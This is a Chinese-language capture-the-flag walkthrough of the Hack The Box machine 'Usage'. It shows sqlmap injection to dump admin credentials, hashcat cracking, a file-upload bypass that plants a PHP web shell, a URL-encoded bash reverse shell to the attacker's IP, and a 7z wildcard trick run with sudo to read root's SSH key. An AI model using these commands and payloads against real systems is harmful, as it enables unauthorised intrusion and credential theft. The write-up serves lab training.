---
title: HTB - Usage
published: 2024-05-14
tags: [HTB]
category: Write Up
draft: false
password: $y$j9T$eHRVEjBacjX.aL3Dv.ayh/$ya7Anf39wpVrmChSihyT1sxtFg.2JLtN/z5oNXKDRc4
abstract: 你看不到我...你看不到我...
message: 輸入密碼
---

# HTB - Usage

Target IP : ```10.10.11.18```

![圖片](https://hackmd.io/_uploads/HyhPj9_bR.png)



---
# user.txt

### Port Enumerate

使用工具 : 
* Rustscan
* nmap

使用命令 ``` rustscan -a 10.10.11.18 --ulimit 6000 -- -sC -sV -Pn```

![圖片](https://hackmd.io/_uploads/HkuY9qdbR.png)

掃出來 Port 後 , 會看到詳細兩個服務和版本 
```
1. 22/tcp open  ssh
2. 80/tcp open  http
```
![圖片](https://hackmd.io/_uploads/H1XTcqdbC.png)



---
### DNS for Virtual web hosting

從上述掃描結果可以看到目標主機有個網頁伺服器
但由於DNS 和 IP 對不上,所以我們要去```/etc/hosts```增加對應關係

![圖片](https://hackmd.io/_uploads/SJ9Sn5_-C.png)

然後就可以進入網站

![圖片](https://hackmd.io/_uploads/Hyhw29uZA.png)

fuzz 過子目錄 , 帳號註冊和登入 ,以及 admin 頁面都沒有收穫
### SQL injection
最後用 sqlmap 盲注 ```http://usage.htb/forget-password``` 頁面

首先用 ```burp Suite``` 抓取 ```POST``` 請求
> 這邊使用 ```FoxyProxy``` 插件
> 因為它內建的瀏覽器真的太爛了...
> 
![圖片](https://hackmd.io/_uploads/SJ0y0qdbA.png)
![圖片](https://hackmd.io/_uploads/rJ2eC5uZA.png)

把 ```POST``` 請求存成一個檔案 我把它存到 ```r.txt```
![圖片](https://hackmd.io/_uploads/ByNQgiOZC.png)

先用以下指令
``sqlmap -r r.txt --dbs --risk 3 --level 3 --threads 8 --batch``

成功後得知他有三個資料庫
```
* imformatioa_schema
* performajce_schema
* usage_blog
```
![圖片](https://hackmd.io/_uploads/HJIoys_bA.png)

我們需要的資訊肯定是在 ```usage_blog```
所以我們 enum 一下裡面有哪些 Tables
```sqlmap -r r.txt -D usage_blog --tables --threads 30 --batch```
![圖片](https://hackmd.io/_uploads/Hk9pxsu-A.png)

很明顯 , 管理員的資訊應該都在 ```admin_users```上
試著提取出裡面的資料

```sqlmap -r r.txt -D usage_blog -T admin_users -columns --threads 6 --batch  ```
![圖片](https://hackmd.io/_uploads/ryu3MiubA.png)

接下來只需要提取 username 和 password 就好了
```sqlmap -r r.txt -D usage_blog --sql-shell --threads 6 --batch```
>由於不知道啥原因沒辦法從 -C 選項直接拿資料
>所以直接用模擬shell的環境用 SQL 語法讀取

![圖片](https://hackmd.io/_uploads/SyJeVi_bC.png)

得到
```
username : admin
password : $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```
## Hash Cat
這個密碼肯定是 Hash 過的 , 所以我們沒辦法直接透過這段進入後台
先想辦法得知他是什麼總類的 Hash 再來做還原的動作

使用```nth```
![圖片](https://hackmd.io/_uploads/SJDhVo_bA.png)

得知是使用 ```bcrypt```的方式 , 現在著手來還原
使用著名的 ```rockyou.txt``` 來當字典檔

```hashcat -a 0 -m 3200 pass.txt rockyou_2.txt --force```

![圖片](https://hackmd.io/_uploads/BkdYrj_WA.png)

結果馬上就跑出來了
現在可以去後台瀏覽
## Reverse Shell | WEB shell
![圖片](https://hackmd.io/_uploads/SkqRrsO-R.png)

可以得知所有系統資訊和框架軟體版本
但主角還是
```
http://admin.usage.htb/admin/auth/setting
```
![圖片](https://hackmd.io/_uploads/SkWSLjubR.png)

這邊經過測試 , 無法上傳非圖像的後門
所以要透過一些小步驟來繞過去

先用 burp suite 來攔截上傳封包
![圖片](https://hackmd.io/_uploads/B14gwidb0.png)

把第22行的 ```filename="q.jpg"``` 改成 ```filename="q.php"```
然後上傳上去

![圖片](https://hackmd.io/_uploads/BkXsPiOb0.png)

302 代表上傳成功 , 如果出現其他的可能是你的令牌過期了
要重新整理一次在攔截一次 POST 請求

接下來,手速要很快,因為它會定期清掉上傳上去的東西
![圖片](https://hackmd.io/_uploads/BJPO_sdZC.png)
可以看到檔案能回傳ls的指令,代表我們成功了
現在準備 payload 和 listener 就能創建一個reverse shell

```
payload = %2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.5%2F4244%200%3E%261%22
```

![圖片](https://hackmd.io/_uploads/HJR6Kj_W0.png)

![圖片](https://hackmd.io/_uploads/BJJDqjub0.png)

當我們成功接收到 reverse shell
到 ```/home/dash``` 底下能拿到 ```user.txt```
# root.txt

![圖片](https://hackmd.io/_uploads/rJPeiodb0.png)

接下來查看底下的檔案中有沒有有用的訊息
找到一個名為 ```.monitrc``` 的檔案
![圖片](https://hackmd.io/_uploads/HyK2is_WA.png)

感覺是另一個帳戶的密碼,我們用```xander```的身分登入ssh看看

![圖片](https://hackmd.io/_uploads/SJdLni_W0.png)

拿到 ssh 後會做幾件事情
```=info
1. 看 ID 當前用戶組有什麼可以用的
2. sudo -l
3. 看開放的port
4. linpeas
```
跑一次 ```sudo -l``` 發現有一個二進制是我能用sudo跑的
![圖片](https://hackmd.io/_uploads/H1OI6iOWR.png)
用 scp 把它載回本地拆
```
scp xander@10.10.11.18:/usr/bin/usage_management ~/
```
## Reverse Engineering
我們用 ```ghidra```分析一輪拆開來看看

![圖片](https://hackmd.io/_uploads/ryfi0o_bR.png)

在 ```backupWebContent(void)``` 函式看到調用到system來執行指令 , 通常這個地方是可以被利用的

然而在網路上看到這一篇文章 : [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)

![圖片](https://hackmd.io/_uploads/HJRw13_bA.png)

7z 會把我們所創建的 @foo 檔案當成目錄表
然而因為不是目錄表它會在執行過程中報錯,並且打印出這個文件
這邊我們就可以用sudo的權限去打印出我們想要的資料

![圖片](https://hackmd.io/_uploads/BJv_W3u-C.png)

這邊選擇打印出 root 底下的 ssh 密鑰

![圖片](https://hackmd.io/_uploads/HkssbnuZ0.png)

打印出來後把金鑰整理成可以使用的格式

![圖片](https://hackmd.io/_uploads/rkGgzndZA.png)

然後記得 ```chmod 600 {KEY_FILE}```
再使用 ```ssh -i key root@10.10.11.18```登入

![圖片](https://hackmd.io/_uploads/HyxOz2dZ0.png)

之後再直接 ```ls``` 就能拿到 ```root.txt```

![圖片](https://hackmd.io/_uploads/B1Pqz3_WR.png)


---






